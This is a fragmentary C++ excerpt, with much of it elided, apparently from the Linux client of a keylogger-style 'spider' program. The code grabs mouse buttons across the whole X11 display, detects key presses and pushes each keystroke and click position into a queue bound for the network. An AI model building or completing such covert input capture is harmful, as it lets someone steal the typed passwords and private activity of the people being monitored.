...
namespace spider
{
  namespace client
  {
	...
	return false;
      ...
      {
        // Left Click
        XGrabButton(_Xdisplay, Button1, AnyModifier, DefaultRootWindow(_Xdisplay), True, ButtonPressMask | ButtonReleaseMask, GrabModeSync, GrabModeSync, None, None);
        // Right Click
        XGrabButton(_Xdisplay, Button3, AnyModifier, DefaultRootWindow(_Xdisplay), True, ButtonPressMask | ButtonReleaseMask, GrabModeSync, GrabModeSync, None, None);
	return false;
      }
      ...
      void SpiderPlugin::runLinux() const
      {
            ...
            for( size_t i = 0; i < sizeof( szKey ); i++ )
            {
                ...
                for ( int j = 0 ; j < 8 ; j++ )
                {
                        if ( ( szBit & iCheck ) && !( szBitOld & iCheck ) )
                        {
                                ...
                                if ( m_linuxKeyboardMap.find(iKeyCode) == m_linuxKeyboardMap.end() ) {
                                        msg.sys.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_NONE);                                        
                                } else {
                                        msg.sys.event.key = static_cast<std::uint32_t>(m_linuxKeyboardMap[iKeyCode]);
                                }
                                msg.sys.event.upper = false;
                                SpiderPlugin::m_sendToNetwork->push(msg);

                                XGetInputFocus( _Xdisplay, &_Xroot_win, &iReverToReturn );
                        }
                    iCheck <<= 1;
                }
            }
        ...
        while (XPending(_Xdisplay) > 0) {
                ...
                if ( report.type == ButtonPress ) {
                        ...
                        if (getPos) {
                                msg.sys.event.posX = static_cast<std::uint32_t>(report.xbutton.x);
                                msg.sys.event.posY = static_cast<std::uint32_t>(report.xbutton.y);
                        }
                        SpiderPlugin::m_sendToNetwork->push(msg);                
                }
        }
